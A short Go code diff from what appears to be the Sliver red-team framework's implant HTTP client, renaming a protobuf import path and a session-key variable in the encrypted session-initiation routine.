@@ -52,7 +52,7 @@ import (
 	"path"
 	"time"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/proxy"
 
 	"github.com/golang/protobuf/proto"
@@ -101,9 +101,9 @@ func (s *SliverHTTPClient) SessionInit() error {
 		// {{end}}
 		return errors.New("error")
 	}
-	skey := RandomAESKey()
-	s.SessionKey = &skey
-	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
+	sKey := RandomAESKey()
+	s.SessionKey = &sKey
+	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
 	if err != nil {
